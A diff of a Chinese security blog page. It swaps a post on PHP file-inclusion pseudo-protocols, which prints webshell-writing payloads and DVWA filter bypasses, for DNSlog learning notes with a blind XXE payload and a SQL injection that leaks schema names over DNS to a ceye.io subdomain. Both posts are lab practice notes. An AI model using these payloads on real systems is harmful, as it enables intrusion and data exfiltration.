@@ -15,11 +15,11 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="通过本地实验环境和dvwa的例题展示如何结合一系列伪协议来利用文件包含漏洞">
+  <meta name="description" content="记录一下DNSlog的学习。">
   <meta name="author" content="Eggs">
   <meta name="keywords" content="Blog">
   
-  <title>文件包含伪协议实践 - 蛋窝窝</title>
+  <title>DNSlog学习 - 蛋窝窝</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -168,7 +168,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="文件包含伪协议实践">
+            <span class="h2" id="subtitle" title="DNSlog学习">
               
             </span>
 
@@ -183,8 +183,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-03-30 17:58" pubdate>
-        2022年3月30日 下午
+      <time datetime="2022-05-13 20:22" pubdate>
+        2022年5月13日 晚上
       </time>
     </span>
   
@@ -195,7 +195,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.3k 字
+      1.2k 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      16
+      13
        分钟
     </span>
   
@@ -235,101 +235,57 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">文件包含伪协议实践</h1>
+            <h1 style="display: none">DNSlog学习</h1>
             
             <div class="markdown-body">
-              <p>通过本地实验环境和dvwa的例题展示如何结合一系列伪协议来利用文件包含漏洞</p>
+              <p>记录一下DNSlog的学习。</p>
 <span id="more"></span>
 
 <hr>
-<h3 id="本地实验环境"><a href="#本地实验环境" class="headerlink" title="本地实验环境"></a>本地实验环境</h3><p>127.0.0.1/a.php源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></div></td></tr></table></figure>
+<h2 id="0x01验证无回显命令"><a href="#0x01验证无回显命令" class="headerlink" title="0x01验证无回显命令"></a>0x01验证无回显命令</h2><p>如果我们发现了一些无回显的漏洞，如sql盲注，xxs盲注，ssrf，那我们怎么确定payload生效了呢？这时我们可以构造payload使目标服务器发起一次网络请求，如果访问一个我们的站点，那么我们的Web服务器日志里面就会有访问记录，通过查看访问日志里是否有记录就可以确定构造的payload是有否效，如果有记录那么接下来我们就可以执行别的命令了。</p>
+<p><em>这也是我之前在xxe盲注中使用的方法</em></p>
+<p>这种方法可行，但需要我们有一个在公网的服务器，有点小成本。我们还可以用另一种便宜又方便的方法，通过DNSlog来实现。</p>
+<p><em>spoiler：除了可以验证命令是否执行，在sql注入，os命令执行的情况下还能直接看到回显内容，详见后文</em></p>
+<h2 id="0x02DNSlog是什么"><a href="#0x02DNSlog是什么" class="headerlink" title="0x02DNSlog是什么"></a>0x02DNSlog是什么</h2><p>字面意思，DNSlog就是DNS的日志服务。DNS将域名解析为真实IP，DNSlog就记录了用户对域名的访问信息。附上工作原理图：<br><img src="https://raw.githubusercontent.com/2693993651/images/master/images/202205132322603.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以用自己的服务器搭建dnslog，也可以用下面推荐的公共免费的dnslog平台。</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.dnslog.cn<br>http:<span class="hljs-regexp">//</span>admin.dnslog.link<br>http:<span class="hljs-regexp">//</span>ceye.io<br></code></pre></div></td></tr></table></figure>
 
-<p>127.0.0.1/info.txt源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
+<h2 id="0x03利用原理"><a href="#0x03利用原理" class="headerlink" title="0x03利用原理"></a>0x03利用原理</h2><p>现在回到无回显的情况，我们不需要使目标访问一个我们可控制的服务器了，只需要使它访问一个我们可控制的域名，也不能说是“可控制的域名”，意思就是我们控制该域名DNS解析服务。</p>
+<p>假设我们现在有个a.com域名，我们将该域名泛解析到我们的DNS服务器上。也就是说我们访问a.a.com、abc.a.com，我们的DNS服务都会解析，dnslog里面也就有对应的记录。</p>
+<p>dnslog.cn这个平台就给我们提供了一个xxx.dnslog.cn的域名，然后无论我们访问什么xxx.xxx.dnslog.cn，我们都能在分配给我们域名的DNS服务中的dnslog里面看到对应的记录。</p>
+<p>其实说要验证无回显漏洞存不存在，我们也不需要管什么泛解析，直接让目标请求xxx.dnslog.cn，然后我们看有没有记录就行了。但是，因为dns有缓存，当别人来访问我们的域名，第一次会来通过我们的dns解析服务来查询，后面就直接通过缓存而不来查询了。解决办法即使在我们的域名前面一直多加一些东西变成更高一级的域名，让目标一直来找我们的服务解析。另外，sql盲注中我们多加的一级域名也可以变成我们所想要看到的数据内容，利用更进一步。</p>
+<h2 id="0x04利用实例"><a href="#0x04利用实例" class="headerlink" title="0x04利用实例"></a>0x04利用实例</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>以dnslog.cn平台为例，我们先申请一个子域名</p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/202205141243353.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="xxs验证"><a href="#xxs验证" class="headerlink" title="xxs验证"></a>xxs验证</h3><p>以pikachu中的xxe盲打为例，在这里我们的输入不会有回显，只有管理员页面才能看到。为了验证我们的输入是否执行了xxs脚本命令，输入下图中的内容</p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/202205141324584.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后当管理员查看时</p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/202205141326429.png" srcset="/img/loading.gif" lazyload></p>
+<p>在dnslog平台处有对应的解析记录，证明xxs代码执行</p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/202205141327204.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<h1 id="注意：以下实验均为成功，不知道为什么，还在尝试中"><a href="#注意：以下实验均为成功，不知道为什么，还在尝试中" class="headerlink" title="注意：以下实验均为成功，不知道为什么，还在尝试中"></a>注意：以下实验均为成功，不知道为什么，还在尝试中</h1></blockquote>
+<h3 id="xxe验证"><a href="#xxe验证" class="headerlink" title="xxe验证"></a>xxe验证</h3><p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [    </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://blindxxe.nb0zug.dnslog.cn&quot;</span> &gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
 
-<p>目的：</p>
-<p>用伪协议实现文件包含或写入木马</p>
-<hr>
-<h3 id="伪协议使用实例"><a href="#伪协议使用实例" class="headerlink" title="伪协议使用实例"></a>伪协议使用实例</h3><h4 id="http"><a href="#http" class="headerlink" title="http://"></a>http://</h4><p>需要allow_url_fopen与allow_url_include同时开启</p>
-<figure class="highlight accesslog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>/a.php?page=http://<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/info.txt<br></code></pre></div></td></tr></table></figure>
-
-<p>效果十分显著，利用远程文件包含实现木马文件在我们服务器上，却能直接控制对方的服务器</p>
-<h4 id="file"><a href="#file" class="headerlink" title="file:///"></a>file:///</h4><p><strong>只能以绝对路径的方式包含本地文件</strong></p>
-<p><em>感觉file加了不如不加。。因为文件包含不用伪协议还能用相对路径。。形如<code>127.0.0.1/a.php?page=../../x.txt</code>，也可以<code>127.0.0.1/a.php?page=F:/x.txt</code></em></p>
-<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/a.php?page=file:///F:\aaa\bbb\info.txt</span><br></code></pre></div></td></tr></table></figure>
-
-<p>需要知道目标服务器的文件路径，而路径的信息有时可通过报错信息得知</p>
-<p>个人感觉比较鸡肋。。</p>
-<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>需要 allow_url_include:On ，allow_url_fopen:On</p>
-<p>可以直接写入PHP代码执行</p>
-<p>写入PHP木马：</p>
-<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=data:<span class="hljs-comment">//text/plain,<span class="hljs-meta">&lt;?PHP</span> fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;<span class="hljs-meta">&lt;?php</span> @eval($_POST[eggs])<span class="hljs-meta">?&gt;</span>&#x27;);<span class="hljs-meta">?&gt;</span></span><br></code></pre></div></td></tr></table></figure>
-
+<p>查看dnslog的解析记录</p>
+<h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>我们现在看到这里接收HTTP协议的请求，试试将我们刚刚申请的子域名填入</p>
+<p>以pikachu的/ssrf/ssrf_curl.php为例，此处有一个接收url的参数</p>
+<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/202205141242575.png" srcset="/img/loading.gif" lazyload></p>
+<p>另外，如果dnslog平台有记录也不能证明此处存在ssrf，只能说明能通过该处发送网络请求，能否请求内网还需进一步判断。</p>
+<h3 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h3><p>mysql数据库中有这样一个函数： load_file() 。这个函数不仅能加载本地文件，也能对url发起请求。</p>
+<p>mysql.ini中secure_file_priv必须为空</p>
+<blockquote>
+<p>（1）当secure_file_priv为null，不允许导入导出</p>
+<p>（2）当secure_file_priv为/tmp导入导出只能在/tmp目录下。</p>
+<p>（3）当secure_file_priv为空，则不作限制允许导入导出（注意NULL不是我们要的空，NULL和空的类型不一样）</p>
+</blockquote>
+<p>且要注意一点：load_file函数在Linux下是无法用来做dnslog攻击的。</p>
+<p>使用此函数需要满足以下条件: (1).所读文件必须在服务器上，且必须指定文件其绝对路径 (2).连接当前数据库用户必须有FILE权限 (3).文件内容必须小于max_allowed_packet。</p>
+<p>payload</p>
+<figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">/sqli-labs-master/Less<span class="hljs-number">-5</span>/?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%27</span><span class="hljs-variable">%20</span><span class="hljs-keyword">and</span><span class="hljs-variable">%20</span>if((<span class="hljs-keyword">select</span><span class="hljs-variable">%20</span>load_file(concat(<span class="hljs-variable">%27</span>\\\\<span class="hljs-variable">%27</span><span class="hljs-punctuation">,</span>(<span class="hljs-keyword">select</span><span class="hljs-variable">%20</span>schema_name<span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>information_schema.schemata)<span class="hljs-punctuation">,</span><span class="hljs-variable">%27</span>.waovao.ceye.io\\abc<span class="hljs-variable">%27</span>)))<span class="hljs-punctuation">,</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">0</span>)--+<br></code></pre></div></td></tr></table></figure>
 
 
 
-
-<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>需要开启 allow_url_fopen，不需要开启 allow_url_include</p>
-<p>如果开启了allow_url_include的话可以在resource参数后加上HTTP协议</p>
-<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220401231855.png" srcset="/img/loading.gif" lazyload></p>
-<p>参考：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
-<p><em>大佬写的👀</em></p>
-<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=php:<span class="hljs-comment">//filter/resource=info.txt	</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=info.txt</span><br>http:<span class="hljs-comment">//127.0.0.1/a.php?page=php://filter/resource=http://127.0.0.1/info.txt</span><br><br><span class="hljs-comment">//结合来看就算是不用过滤器，也能指定远程文件包含木马</span><br></code></pre></div></td></tr></table></figure>
-
-<p>read模式下+过滤器读源码很好用。另外根据大佬的博客，我们可以在传递参数时利用write模式+过滤器破坏页面中代码结构来绕过防护。</p>
-<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>可以直接写入PHP代码来执行当，enctype=multipart/form-data时,php:/input将会无效</p>
-<p>传递以下post数据包来写入木马：</p>
-<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/a.php?page=php:<span class="hljs-comment">//</span><br><br><span class="hljs-meta">&lt;?PHP</span> fputs(fopen(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[eggs])?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
-
-<p>图例：</p>
-<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220402165611.png" srcset="/img/loading.gif" lazyload></p>
-<hr>
-<h3 id="dvwa–FIle-Inclusion实践"><a href="#dvwa–FIle-Inclusion实践" class="headerlink" title="dvwa–FIle Inclusion实践"></a>dvwa–FIle Inclusion实践</h3><p>关卡设计：</p>
-<ul>
-<li><p>Local File Inclusion (LFI) </p>
-<p>让我们用本地文件包含读取路径为<code>../../hackable/flags/fi.php</code>的文件。这个文件一共有五个句子，其中的1，2，4是直接用echo语句输出的，所以直接包含该文件时就可以看到，3在编译时被覆盖了，只能通过源码看到，5被写在了html注释里，被包含后F12就能看到。综上，我们除了实现直接包含文件外，还要考虑怎么读取php页面源码。</p>
-</li>
-<li><p>Remote File Inclusion (RFI)</p>
-<p>远程文件包含的思路为下图</p>
-<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/file_include002.jpg" srcset="/img/loading.gif" lazyload></p>
-<p><strong>但用蚁剑连接时需要注意</strong>，如果是远程包含我们服务器上的PHP木马时，PHP木马不要存为PHP文件。因为目标服务器包含我们服务器的文件时，我们的服务器会先对其进行解析再把文件传给目标服务器，导致PHP代码失效，所以可设为txt格式。并且还需要额外设置cookie信息，完整url和cookie信息如下：</p>
-<p><img src="https://raw.githubusercontent.com/2693993651/images/master/images/20220331170328.png" srcset="/img/loading.gif" lazyload></p>
-<p>另外，也可以在我们的页面布置这个PHP文件：</p>
-<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> fputs(fopen(<span class="hljs-string">&#x27;shell.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php assert($_POST[eggs]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>
-
-<p>在站点构造url，使用HTTP协议远程包含该文件，在其目录下生成shell.php后用蚁剑直接连（不用设置cookie）</p>
-<h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>完全没防护</p>
-<h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;http://&quot;</span>, <span class="hljs-string">&quot;https://&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-comment">//这句话中多打了个双引号，&quot;..\\&quot;&quot;过滤的是..，所以可以直接用..\绕过</span><br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure>
-
-<p>双写（RFI）：<code>http://127.0.0.1/DVWA-master/vulnerabilities/fi/?page=httphttp://://127.0.0.1/eggs.txt</code>，或者利用PHP伪协议，<code>php://input</code>、<code>php://data</code>和<code>php://filter</code></p>
-</li>
-</ul>
-<p>​        突破方法大同小异，我上面的payload改一改就行了</p>
-<ul>
-<li><h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-keyword">if</span>( !fnmatch( <span class="hljs-string">&quot;file*&quot;</span>, <span class="hljs-variable">$file</span> ) &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;include.php&quot;</span> ) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></div></td></tr></table></figure>
-
-<p>要求输入的参数<code>page</code>必须以<code>file</code>开头，所以可以利用file:///协议读取本地文件（需知晓服务器文件路径，在这里可从报错信息中得知），或结合文件上传漏洞运行木马</p>
-</li>
-</ul>
-<h3 id="伪协议使用总结"><a href="#伪协议使用总结" class="headerlink" title="伪协议使用总结"></a>伪协议使用总结</h3><ul>
-<li><p>http://</p>
-<p>allow_url_fopen与allow_url_include都需要开启 </p>
-<p>简单明了好用 </p>
-</li>
-<li><p>php://filter </p>
-<p>常用read模式，如果开启allow_url_include的话和HTTP一样好用，就算没开启也能方便的读取页面源码</p>
-</li>
-<li><p>php://input和php://data</p>
-<p>写入可执行PHP代码，PHP木马</p>
-</li>
-<li><p>file：///</p>
-<p>只能以绝对路径读取本地文件，鸡肋</p>
-</li>
-</ul>
-<p>以上伪协议（除了写入代码的input和data）配合文件上传漏洞能更好发挥作用</p>
-<hr>
-<p>完结 : )🐣</p>
 
             </div>
             <hr>
@@ -349,9 +305,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a>
-                    
-                      <a class="hover-with-bg" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
+                      <a class="hover-with-bg" href="/tags/DNSlog/">DNSlog</a>
                     
                   </div>
                 
@@ -368,18 +322,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/04/04/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">XXE学习笔记</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/03/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                        <span class="hidden-mobile">文件包含学习笔记</span>
+                      <a href="/2022/04/18/thinkphp-pop%E9%93%BE/">
+                        <span class="hidden-mobile">thinkphp_pop链</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
